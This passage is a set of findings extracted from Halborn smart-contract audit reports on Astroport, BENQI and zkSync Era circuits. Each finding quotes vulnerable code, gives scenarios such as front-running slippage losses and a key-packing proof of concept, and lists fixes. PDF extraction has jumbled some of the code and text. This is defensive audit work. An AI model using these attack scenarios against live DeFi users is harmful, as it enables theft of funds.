"Astroport_fi_AMM_Protocol_CosmWasm", "Severity: High"]}, {"title": "ADDING LIQUIDITY TO NEW POOLS DOES NOT WORK PROPERLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When users call provide_liquidity function in contracts/pair/src/contract.rs or contracts/pair_stable/src/contract.rs to add liquidity to new pools (i.e.: pools with no deposits), the assert_slippage_tolerance function is triggered and will always panic if slippage is specified at the This situation can produce the following beginning of the operation. consequences:  When legitimate users try to add liquidity to new pools, operations will always panic and make users spend transactions fees needlessly.  To force a new pool to work as expected, a user should transfer tokens directly to the pool without receiving LP tokens in return, and with the risk that another user benefit from his deposit.  The issues explained above will arise every time a new pool is created (or when its deposits become 0) and legitimate users try to add liquidity. Code Location: Listing 7: contracts/pair/src/contract.rs (Lines 833,835) 832 if Decimal256 :: from_ratio ( deposits [0] , deposits [1]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [0] , pools [1]) || Decimal256 :: from_ratio ( deposits [1] , deposits [0]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [1] , pools [0]) return Err ( ContractError :: MaxSlippageAssertion {}) ; 833 834 835 836 837 838 { } 26 Listing 8: contracts/pair_stable/src/contract.rs (Lines 942,944) 941 if Decimal256 :: from_ratio ( deposits [0] , deposits [1]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [0] , pools [1]) || Decimal256 :: from_ratio ( deposits [1] , deposits [0]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [1] , pools [0]) return Err ( ContractError :: MaxSlippageAssertion {}) ; 942 943 944 945 946 947 { } Risk Level: Likelihood - 5 Impact - 2 Recommendations: Update the logic of assert_slippage_tolerance function to handle correctly the case where a pool has no deposits and slippage is specified as an argument of the function. Remediation plan: SOLVED: The issue was fixed in commit 612e570f16ae0020a9c45fb30c6115dec83850d5. 27 ", "labels": ["Halborn", "Astroport_fi_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "UPDATING A CONFIG PARAMETER AFFECTS PAST REWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "tokens_per_block is a configuration parameter of the astroport-generator It is used to calculate the amount of rewards a user is contract. eligible for. However, if this parameters value is modified after pools are created all rewards will be calculated using the updated value, regardless of when deposits were made. For example, if users had deposited tokens when tokens_per_block was x and withdrew when tokens_per_block was y all their rewards were calculated using value y. Code Location: Listing 9: contracts/generator/src/contract.rs (Lines 43) deps : DepsMut , _env : Env , info : MessageInfo , msg : InstantiateMsg , 28 pub fn instantiate ( 29 30 31 32 33 ) -> Result < Response , ContractError > { 34 set_contract_version ( deps . storage , CONTRACT_NAME , CONTRACT_VERSION ) ?; let mut allowed_reward_proxies : Vec < Addr > = vec! []; for proxy in msg . allowed_reward_proxies { allowed_reward_proxies . push ( deps . api . addr_validate (& proxy ) ?) ; } let config = Config { astro_token : deps . api . addr_validate (& msg . astro_token )? , tokens_per_block : msg . tokens_per_block , total_alloc_point : Uint64 :: from (0 u64 ) , 35 36 37 38 39 40 41 42 43 44 28 Listing 10: tokenomics/generator/src/contract.rs (Lines 758) 756 fn set_tokens_per_block ( deps : DepsMut , amount : Uint128 ) -> Result < Response , ContractError > { CONFIG . update :: <_ , ContractError >( deps . storage , | mut v| { v . tokens_per_block = amount ; Ok ( v ) }) ?; Ok ( Response :: new () . add_event ( Event :: new (\" Set tokens per block \"). add_attribute (\" amount \" , amount )) ) 757 758 759 760 761 762 763 } Risk Level: Likelihood - 2 Impact - 4 Recommendations: Call the mass_update_pools function before updating the tokens_per_block parameter to ensure rewards are calculated correctly. Remediation plan: SOLVED: The issue was fixed in commit 3a4a8a96e9eec94e8868662eca453601a8d342d9. Pools are now updated before the tokens_per_block parameters value is changed. 29 ", "labels": ["Halborn", "Astroport_fi_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "MAXIMUM THRESHOLD FOR SLIPPAGE IS NOT ENFORCED WHEN ADDING LIQUIDITY OR SWAPPING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When users add liquidity / swap and do not specify slippage tolerance (or its equivalent) in the operation, Astroport AMM protocol does not enforce a default maximum threshold, which could severely affect users amount of tokens received in return. This issue can produce the following scenarios: Scenario #1: Adding liquidity  Someone creates a pool with 8000 token X and 2000 token Y, as a consequence, creator receives 4000 LP in return.  User A sends a transaction to provide liquidity of 80 token X and 20 token Y to the pool, so he expects to receive 40 LP in return.  However, some seconds before transaction of user A is processed, user B swaps 12000 token X to 1200 token Y. The final balance in the pool is: 20000 token X and 800 token Y.  When transaction of user A is processed, he receives 16 LP in return, instead of 40 LP he was expecting, i.e.: less than 50%. Scenario #2: Adding liquidity (imbalanced token pair) If a user mistakenly (or fooled by an attacker) provides liquidity with an imbalanced token pair, he could lose all his excedent tokens. See the following example:  Someone creates a pool with 8000 token X and 2000 token Y, as a consequence, creator receives 4000 LP in return. 30  User A provides liquidity of 80 token X and 20 token Y to the pool, so he receives 40 LP in return.  User B provides liquidity of 80 token X and 2000 token Y, he also receives 40 LP in return, the same amount of LP tokens than previous transaction, but spending 100 times more token B. Scenario #3: Swapping  Someone creates a pool with 8000 token X and 2000 token Y.  User A sends a transaction to swap 100 token X and expects to receive ~25 token Y in return.  However, some seconds before transaction of user A is processed, user B swaps 12000 token X to 1200 token Y. The final balance in the pool is: 20000 token X and 800 token Y.  When transaction of user A is processed, he receives ~4 token Y in return, instead of ~25 token Y he was expecting, i.e.: less than 20% of expected value. Some recent DeFi attacks as occurred to BT.Finance or Saddle Finance show the importance to have a maximum predefined slippage to reduce the impact of tokens loss if unexpected situations appear or attackers compromise smart contracts in a platform. Code Location: When users add liquidity to a pool, assert_slippage_tolerance function will always return Ok(()) if slippage is not specified: Listing 11: contracts/pair/src/contract.rs (Lines 821,841) 821 if let Some ( slippage_tolerance ) = * slippage_tolerance { 822 823 824 let slippage_tolerance : Decimal256 = slippage_tolerance . into () ; if slippage_tolerance > Decimal256 :: one () { return Err ( StdError :: generic_err ( \" slippage_tolerance cannot bigger than 1\" ). into () ); 31 825 826 827 } let one_minus_slippage_tolerance = Decimal256 :: one () - slippage_tolerance ; 828 let deposits : [ Uint256 ; 2] = [ deposits [0]. into () , deposits [1]. into () ]; 829 let pools : [ Uint256 ; 2] = [ pools [0]. amount . into () , pools [1]. amount . into () ]; 830 831 // Ensure each prices are not dropped as much as slippage tolerance rate 832 if Decimal256 :: from_ratio ( deposits [0] , deposits [1]) * 833 834 one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [0] , pools [1]) || Decimal256 :: from_ratio ( deposits [1] , deposits [0]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [1] , pools [0]) return Err ( ContractError :: MaxSlippageAssertion {}) ; { 835 836 837 838 839 } 840 841 Ok (() ) } Listing 12: contracts/pair_stable/src/contract.rs (Lines 930,950) 930 if let Some ( slippage_tolerance ) = * slippage_tolerance { 931 let slippage_tolerance : Decimal256 = slippage_tolerance . into () 932 933 934 935 936 937 938 939 940 ; if slippage_tolerance > Decimal256 :: one () { return Err ( StdError :: generic_err (\" slippage_tolerance cannot bigger than 1\" ). into () ); } let one_minus_slippage_tolerance = Decimal256 :: one () - slippage_tolerance ; let deposits : [ Uint256 ; 2] = [ deposits [0]. into () , deposits [1]. into () ]; let pools : [ Uint256 ; 2] = [ pools [0]. amount . into () , pools [1]. amount . into () ]; // Ensure each prices are not dropped as much as slippage tolerance rate 32 941 942 943 if Decimal256 :: from_ratio ( deposits [0] , deposits [1]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [0] , pools [1]) || Decimal256 :: from_ratio ( deposits [1] , deposits [0]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [1] , pools [0]) return Err ( ContractError :: MaxSlippageAssertion {}) ; { 944 945 946 947 948 } 949 950 Ok (() ) } When users try to swap, assert_max_spread function will always return Ok(()) if max_spread is not specified: Listing 13: contracts/pair/src/contract.rs (Lines 795,807,813) 788 pub fn assert_max_spread ( 789 790 791 792 793 794 ) -> Result <() , ContractError > { 795 belief_price : Option < Decimal >, max_spread : Option < Decimal >, offer_amount : Uint128 , return_amount : Uint128 , spread_amount : Uint128 , if let ( Some ( max_spread ) , Some ( belief_price )) = ( max_spread , 796 797 798 799 800 801 802 803 804 805 806 807 808 belief_price ) { let expected_return = offer_amount * Decimal :: from ( Decimal256 :: one () / Decimal256 :: from ( belief_price )) ; let spread_amount = expected_return . checked_sub ( return_amount ) . unwrap_or_else (| _| Uint128 :: zero () ); if return_amount < expected_return && Decimal :: from_ratio ( spread_amount , expected_return ) > max_spread { } return Err ( ContractError :: MaxSpreadAssertion {}) ; } else if let Some ( max_spread ) = max_spread { if Decimal :: from_ratio ( spread_amount , return_amount + spread_amount ) > max_spread { 33 return Err ( ContractError :: MaxSpreadAssertion {}) ; 809 810 811 812 813 814 } } } Ok (() ) Listing 14: contracts/pair_stable/src/contract.rs (Lines 904,916,922) 897 pub fn assert_max_spread ( 898 899 900 901 902 903 ) -> Result <() , ContractError > { 904 belief_price : Option < Decimal >, max_spread : Option < Decimal >, offer_amount : Uint128 , return_amount : Uint128 , spread_amount : Uint128 , if let ( Some ( max_spread ) , Some ( belief_price )) = ( max_spread , belief_price ) { let expected_return = offer_amount * Decimal :: from ( Decimal256 :: one () / Decimal256 :: from ( belief_price )) ; let spread_amount = expected_return . checked_sub ( return_amount ) . unwrap_or_else (| _| Uint128 :: zero () ); if return_amount < expected_return && Decimal :: from_ratio ( spread_amount , expected_return ) > max_spread { } return Err ( ContractError :: MaxSpreadAssertion {}) ; } else if let Some ( max_spread ) = max_spread { if Decimal :: from_ratio ( spread_amount , return_amount + spread_amount ) > max_spread { return Err ( ContractError :: MaxSpreadAssertion {}) ; } } Ok (() ) 905 906 907 908 909 910 911 912 913 914 915 916 917 918 919 920 921 922 923 } 34 Risk Level: Likelihood - 2 Impact - 4 Recommendations: Enforce the use of a default maximum threshold when users add liquidity or swap, but do not specify slippage tolerance (or its equivalent) or slippage value is greater than the threshold. As a reference, max slippage for Uniswap Pool and Uniswap Swap is 50%. Remediation plan: SOLVED: The issue was fixed in the following commits:  163ff75bbd42953eff9669fe2d6d081b7919c3fe  52db1fde41737274ec5beb182546ba4f76382752  fdd6eaec8ce5cb7d5ca7156e4d22ec9654fc7de7 35 ", "labels": ["Halborn", "Astroport_fi_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION IN FACTORY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "An incorrect use of execute_update_config function in contracts/factory/s- rc/contract.rs can set owner of factory contract to an invalid address and inadvertently lose total control of this contract, which cannot be undone in any way. Currently, the owner of the factory contract can change the owner address using the aforementioned function in a single transaction and without confirmation from the new address. Code Location: Listing 15: contracts/factory/src/contract.rs (Lines 127) 125 126 127 128 if let Some ( owner ) = owner { // validate address format config . owner = deps . api . addr_validate ( owner . as_str () ) ?; } Risk Level: Likelihood - 2 Impact - 4 Recommendations: It is recommended to split owner transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by the recipient. 36 Remediation plan: SOLVED: The issue was fixed in commit d087c04d99f3b44b9c65ebf676fd40cee99d47cf. 37 ", "labels": ["Halborn", "Astroport_fi_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "OWNER ADDRESS NOT TRANSFERABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some governance operations on the astroport-generator and astroport -maker contracts require current contract owner signature. Since neither contract implements a governance address transfer function it is impossible to assign a new owner in case the current account is compromised. Code Location: Listing 16: tokenomics/generator/src/contract.rs (Lines 45) 28 #[ cfg_attr ( not ( feature = \" library \") , entry_point ) ] 29 pub fn instantiate ( 30 31 32 33 34 ) -> Result < Response , ContractError > { 35 deps : DepsMut , _env : Env , info : MessageInfo , msg : InstantiateMsg , set_contract_version ( deps . storage , CONTRACT_NAME , CONTRACT_VERSION ) ?; let mut allowed_reward_proxies : Vec < Addr > = vec! []; for proxy in msg . allowed_reward_proxies { allowed_reward_proxies . push ( deps . api . addr_validate (& proxy ) ?) ; } let config = Config { astro_token : deps . api . addr_validate (& msg . astro_token )? , tokens_per_block : msg . tokens_per_block , total_alloc_point : Uint64 :: from (0 u64 ) , owner : info . sender , 36 37 38 39 40 41 42 43 44 45 46 38 Listing 17: tokenomics/maker/src/contract.rs (Lines 45) 35 let governance_percent = if let Some ( governance_percent ) = msg . governance_percent { 36 37 38 39 40 41 42 43 44 45 46 if governance_percent > Uint64 :: new (100) { return Err ( ContractError :: IncorrectGovernancePercent {}) ; }; governance_percent } else { Uint64 :: zero () }; let cfg = Config { owner : info . sender , astro_token_contract : deps . api . addr_validate (& msg . astro_token_contract )? , Risk Level: Likelihood - 2 Impact - 4 Recommendations: Implement governance functions updating the owner addresses in case the current ones are compromised. Remediation plan: SOLVED: The issue was fixed in commit bdf6f59e4270303e818b031b619345dfa8d6d19e. 39 ", "labels": ["Halborn", "Astroport_fi_AMM_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "MISCALCULATION OF REVERSE SIMULATION IN STABLE PAIRS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "make users reverse When pairs, simulation compute_offer_amount function in contracts/pair_stable/src/contract.rs calls calc_amount function with an incorrect ask_amount parameter, i.e.: with commission already deducted. As a consequence, values returned in reverse simulation queries will always be lesser than real ones. queries stable in Code Location: Listing 18: contracts/pair_stable/src/contract.rs (Lines 860) 853 let greater_precision = offer_precision . max ( ask_precision ); 854 let offer_pool = adjust_precision ( offer_pool , offer_precision , greater_precision ) ?; 855 let ask_pool = adjust_precision ( ask_pool , ask_precision , greater_precision ) ?; 856 let ask_amount = adjust_precision ( ask_amount , ask_precision , greater_precision ) ?; 857 858 let offer_amount = adjust_precision ( 859 860 Uint128 :: new ( calc_amount ( ask_pool . u128 () , offer_pool . u128 () , ask_amount . u128 () , amp ). unwrap () , 861 862 863 864 ) ?; ) , greater_precision , offer_precision , Risk Level: Likelihood - 5 Impact - 1 40 Recommendations: Update the logic of compute_offer_amount function to call calc_amount function with ask_amount parameter without commission deducted. Remediation plan: SOLVED: The issue was fixed in commit 06728064a0eeda2b47dd1f8b1dbe0e975a700ecc. The Astroport team also discovered this security issue while security audit was in progress and solved it timely. 41 3.10 (HAL-10) ADDRESS VALIDATION MISSING - LOW ", "labels": ["Halborn", "Astroport_fi_AMM_Protocol_CosmWasm", "Severity: Informational"]}, {"title": "MISSING PAYMENT AMOUNT CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The BENQI Finance protocol includes some financial functions such as borrow, liquidate, transfer, etc. Attackers could use these functions Other with large amounts in Flash-Loan or similar financial attacks. DeFi platforms (The DAO, Spartan, and others) were hacked, and attackers stole a significant amount of funds. We observed during the test that there are no restrictions on large transfers. Code Location: Comptroller.sol Lines #330-363 Figure 1: Missing Payment Amount Check - Comptroller 15 Comptroller.sol Lines #463-493 Figure 2: Missing Payment Amount Check - Comptroller Comptroller.sol Lines #595-612 Figure 3: Missing Payment Amount Check - Comptroller Recommendation: It is recommended to implement a mechanism which controls payment amount. 16 Remediation Plan: Accepted Risk: transactions. It was not considered appropriate to limit users in 17 ", "labels": ["Halborn", "Benqi", "Severity: Medium"]}, {"title": "MISSING ADDRESS VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "A few contracts in the BENQI project are missing a safety check inside the constructors. The address-type parameter setter should include a zero-address test; otherwise, the contracts functionality may become inaccessible or tokens burnt forever. Code Location: Timelock.sol Figure 4: Missing Address Validation - Timelock Reservoir.sol Figure 5: Missing Address Validation - Reservoir 18 Benqi.sol Figure 6: Missing Address Validation - Benqi Risk Level: Likelihood - 2 Impact - 2 19 Recommendation: It would be safer to perform additional validation before assigning Usage of a whitelist method or a user-supplied values on contracts. modifier could solve the issue. For example: Listing 1 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract address \" ); _; } Remediation Plan: Solved: BENQI Finance team implemented necessary controls on the address checks. 20 ", "labels": ["Halborn", "Benqi", "Severity: Low"]}, {"title": "USAGE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "contracts Timelock.sol, Comptroller.sol, ComptrollerG1.sol, The Reservoir.sol and GovernorAlpha.sol use block.timestamp. The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: Timelock.sol Figure 7: Usage of block.timestamp - Timelock Comptroller.sol Figure 8: Usage of block.timestamp - Comptroller 21 Reservoir.sol Figure 9: Usage of block.timestamp - Reservoir GovernorAlpha.sol Figure 10: Usage of block.timestamp - GovernorAlpha Risk Level: Likelihood - 1 Impact - 3 Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. If possible, use an oracle. Remediation Plan: Not Applicable: The timestamp keyword has been used intentionally. It is not necessary to change the contract given the risk. The consensus protocols of the Avalanche chain will prevent this attack. 22 ", "labels": ["Halborn", "Benqi", "Severity: Low"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the Benqi contracts use pragma version 0.5.16. The latest pragma version is (0.8.3) was released in April 2021. Many pragma versions have been released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Code Location: QiToken.sol Line #1 Figure 11: Pragma Version - QiToken Risk Level: Likelihood - 1 Impact - 3 23 Recommendation: In the Solidity Github repository, there is a json file listing the bugs reported for each compiler version. No bugs have been found in > 0.7.3 versions and very few in 0.7.0 -- 0.7.3. The latest stable version is pragma 0.6.12. Furthermore, pragma 0.6.12 is widely used by Solidity developers and has been extensively tested in many security audits. We recommend using at minimum the latest stable version. Reference: https://github.com/ethereum/solidity/blob/develop/docs/ bugs_by_version.json Remediation Plan: Solved: The BENQI Finance team fixed this issue by setting the pragma version to 0.5.17 which is one of the stable releases. 24 ", "labels": ["Halborn", "Benqi", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "FLOATING PRAGMA", "labels": ["Halborn", "Benqi", "Severity: Low"]}, {"title": "USAGE OF INLINE ASSEMBLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Inline assembly is a way to access the Virtual Machine at a low level. This discards several important safety features in Solidity. Benqi.sol Line #297 QiErc20.sol Lines #158-170 QiErc20Delegator.sol Lines #449-453 27 Unitroller.sol Lines #139-146 Risk Level: Likelihood - 1 Impact - 3 Recommendation: The contracts should avoid using inline assembly because it interacts with the AVM (Avalanche Virtual Machine) at a low level. An attacker could bypass many essential safety features of Solidity. Remediation Plan: Accepted Risk: The contracts require inline assembly, and the risk is acceptable. 28 ", "labels": ["Halborn", "Benqi", "Severity: Low"]}, {"title": "INCORRECT DIVISION ON WHITEPAPER INTEREST RATE MODEL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the WhitePaperInterestRateModel.sol contract, there is an incorrect division operation. According to comments in the contract, the interest rate is raised by 1e18. Some functions multiply user-controlled values by 1e18. However, the constructor doesnt have this multiplication operation. The timestampsPerYear variable is defined as 31536000.When the contract is deployed, to set 200 as the baseRatePerTimestamp variable, the deployer must use 200 * 31536000 for the baseRatePerYear variable. If the deployer sets the baseRatePerYear variable to 200, then the contract will execute the following code to calculate baseRatePerTimestamp variable: Listing 2 1 1. baseRatePerTimestamp = baseRatePerYear . div ( timestampsPerYear ); 2 2. baseRatePerTimestamp = 200. div (31536000) ; 3 3. baseRatePerTimestamp = 0 29 Code Location: WhitePaperInterestRateModel.sol Line #19-41 Figure 12: Incorrect Division on Interest Rate Model Risk Level: Likelihood - 2 Impact - 1 Recommendation: Multiply the baseRatePerYear and multiplierPerYear variables as a mantissa value raised by 1e18 power before division. Otherwise, the result will be zero. Remediation Plan: Solved: multiplication and division operations to the related functions. The BENQI Finance team solved this issue by adding new 30 ", "labels": ["Halborn", "Benqi", "Severity: Informational"]}, {"title": "LACK OF INPUT VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the GovernorAlpha.sol contract, The description parameter can be left empty by the function. Code Location: GovernanceAlpha.sol Line #142 Figure 13: Lack Of Input Validation Risk Level: Likelihood - 1 Impact - 1 Recommendation: The contract should implement validation on the user controlled inputs which should be performed using a require statement. 31 Remediation Plan: Solved: The BENQI Finance team fixed this issue by implementing input validation to the contract. 32 3.9 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "Benqi", "Severity: Informational"]}, {"title": "CIRCUIT NOT PROPERLY WORKING WHEN USING SHARD ID > 0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf", "body": "The STORAGE QUERIES FILTER circuit (storage_validity_by_grand_product) does not produce the intended output when shard ID is greater than 0. When the keys of each element of the initial queue are being packed throughout the sorting of the queues, the second linear combination is wrongly created, overlapping the bits of the address variable, due to using the incorrect coefficient. The problem with this bug, is that as the pack_key function is returning an incorrect packed key to the sorting functionality, the final sorted queue of the circuit is not being properly generated, leading to even more issues afterward. This can be seen as a completeness bug. Code Location: Listing 1: storage_validity_by_grand_product/mod.rs (Line 425) 419 const PACKED_WIDTHS : [ usize ; 2] = [192 , 232]; 420 // now resolve a logic 421 for ( item , is_trivial ) in it { 422 423 424 425 426 427 let packed_key = pack_key ( // check if keys are equal and check a value let TimestampedStorageLogRecord { record , timestamp } = item ; cs , ( record . shard_id . clone () , record . address . clone () , record .  key ) , 428 429 430 431 432 ) ?; // ensure sorting let ( keys_are_equal , previous_key_is_greater ) = prepacked_long_comparison ( cs , & previous_packed_key , &  packed_key , & PACKED_WIDTHS ) ?; 15 433 434 can_not_be_false_if_flagged ( cs , & previous_key_is_greater . not ()  , & is_trivial . not () ) ?; 435 436 437 // if keys are the same then timestamps are sorted let (_ , previous_timestamp_is_less ) = previous_timestamp . sub (  cs , & timestamp ) ?; 438 439 // enforce if keys are the same and not trivial let must_enforce = smart_and (cs , &[ keys_are_equal , is_trivial .  not () ]) ?; 440 can_not_be_false_if_flagged ( cs , & previous_timestamp_is_less , &  must_enforce ) ?; 441 442 443 // we follow the procedure : // if keys are different then we finish with a previous one  and update parameters 444 // else we just update parameters Listing 2: storage_validity_by_grand_product/mod.rs (Line 669) let shifts = compute_shifts :: < E :: Fr >() ; cs : & mut CS , key_tuple : ( Byte <E >, UInt160 <E >, UInt256 <E >) , 650 pub fn pack_key <E : Engine , CS : ConstraintSystem <E > >( 651 652 653 ) -> Result <[ Num <E >; 2] , SynthesisError > { 654 655 656 657 658 659 660 let ( shard_id , address , key ) = key_tuple ; let mut lc_0 = LinearCombination :: zero () ; lc_0 . add_assign_number_with_coeff (& key . inner [0]. inner , shifts // LE packing  [0]) ; 661 lc_0 . add_assign_number_with_coeff (& key . inner [1]. inner , shifts  [64]) ; 662 lc_0 . add_assign_number_with_coeff (& key . inner [2]. inner , shifts  [128]) ; 663 664 665 666 667 // 192 in total let value_0 = lc_0 . into_num ( cs ) ?; let mut lc_1 = LinearCombination :: zero () ; lc_1 . add_assign_number_with_coeff (& key . inner [3]. inner , shifts  [0]) ; 668 669 lc_1 . add_assign_number_with_coeff (& address . inner , shifts [64]) ; lc_1 . add_assign_number_with_coeff (& shard_id . inner , shifts 16  [160]) ; 670 671 672 673 674 } let value_1 = lc_1 . into_num ( cs ) ?; // 64 + 160 + 8 = 232 in total Ok ([ value_0 , value_1 ]) Proof of Concept: 1. The STORAGE QUERIES FILTER circuit receives as input witness the storage access requests queue. 2. This circuit aims to order the resulting queue of all the elements in the initial queue by a generated key. 3. The circuit calls the pack_key function to generate the key for the current element of the queue. 4. A shard_id different from 0 is being used. 5. Within the generated key, the bits of the address parameter gets overlapped with the bits of the shard_id. 6. An incorrect key is returned to the main function of the circuit, thus breaking the overall functionality of the circuit. 7. The resulting queue is not ordered as expected, leading to even more issues afterward. Risk Level: Likelihood - 5 Impact - 5 17 Recommendation: The last coefficient on line 669 needs to be shifts[224] instead of shifts[160]. Listing 3: storage_validity_by_grand_product/mod.rs (Line 669) 666 let mut lc_1 = LinearCombination :: zero () ; 667 lc_1 . add_assign_number_with_coeff (& key . inner [3]. inner , shifts [0]) ; 668 lc_1 . add_assign_number_with_coeff (& address . inner , shifts [64]) ; 669 lc_1 . add_assign_number_with_coeff (& shard_id . inner , shifts [224]) ; 670 let value_1 = lc_1 . into_num ( cs ) ?; Moreover, would be useful to check after each linear combination if the shift value is within the capacity by using: Listing 4: storage_validity_by_grand_product/mod.rs 0 assert! ( shift <= E :: Fr :: CAPACITY as usize ); Remediation Plan: SOLVED: The MatterLabs team solved the issue by fixing the offset and adding assertion. Commit ID : 5109e0768c7de799f87ec67bf40b6a544cca4e4e 18 ", "labels": ["Halborn", "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge", "Severity: Critical"]}, {"title": "HEAD STATE NOT ENFORCED TO BE ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf", "body": "The MESSAGES EVENTS FILTER circuit (log_sorter) is not enforcing the head state of the initial queue received as input to be zero. Even though the LOG DEMULTIPLEXER circuit gives as output all queues that were initially empty, already enforcing the head state to be zero, it is essential to ensure it is atomically checked in each circuit, regardless of where the input is coming from. Code Location: Listing 5: log_sorter/mod.rs project_ref! ( witness , intermediate_sorted_queue_state ). cloned 49 let structured_input_witness = project_ref! ( witness ,  closed_form_input ). cloned () ; 50 let initial_queue_witness = project_ref! ( witness ,  initial_queue_witness ). cloned () ; 51 let intermediate_sorted_queue_state = 52  () ; 53 let sorted_queue_witness = project_ref! ( witness ,  sorted_queue_witness ). cloned () ; 54 55 let mut structured_input = EventsDeduplicatorInputOutput ::  alloc_ignoring_outputs ( 56 57 58 ) ?; 59 60 Boolean :: enforce_equal ( cs , & structured_input . start_flag , & Boolean  :: constant ( true )) ?; 61 62 let mut initial_queue = StorageLogQueue :: from_raw_parts ( 63 64 65 66 cs , structured_input_witness . clone () , . observable_input . initial_log_queue_state cs , structured_input 19 . head_state , structured_input . observable_input . initial_log_queue_state . tail_state , structured_input 67 68 69 70 71 72 73 74 75 76 ) ?; 77 78 // dbg! ( initial_queue . clone () . into_state () . create_witness () ) ; 79 80 if let Some ( wit ) = initial_queue_witness { 81 82 } . observable_input . initial_log_queue_state . num_items , initial_queue . witness = wit ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: Adding the enforcement for the initial queue head state to be zero right after getting it from the input witness. Listing 6: log_sorter/mod.rs (Line 79) 77 78 // it must be trivial 79 initial_queue . head_state . enforce_equal ( cs , & Num :: zero () ) ?; 80 81 // dbg! ( initial_queue . clone () . into_state () . create_witness () ) ; 82 83 if let Some ( wit ) = initial_queue_witness { 84 85 } initial_queue . witness = wit ; 20 Remediation Plan: SOLVED: The MatterLabs team solved the issue by enforcing the initial queue head state to zero. Commit ID : b0a79356613655bddccaab3b89dbf1142b5483fb 21 ", "labels": ["Halborn", "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge", "Severity: Low"]}, {"title": "UNUSED CIRCUIT FUNCTIONALITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf", "body": "the LOG DEMULTIPLEXER the never The demultiplex_storage_logs_inner_optimized function is used Within demultiplex_storage_logs_inner used. instead. (demux_log_queue) function declared circuit but is Code Location: Listing 7: demux_log_queue/mod.rs 144 pub fn demultiplex_storage_logs_inner < 145 146 147 E: Engine , CS : ConstraintSystem <E >, R: CircuitArithmeticRoundFunction <E , 2, 3, StateElement = Num <  E >>, 148 >( 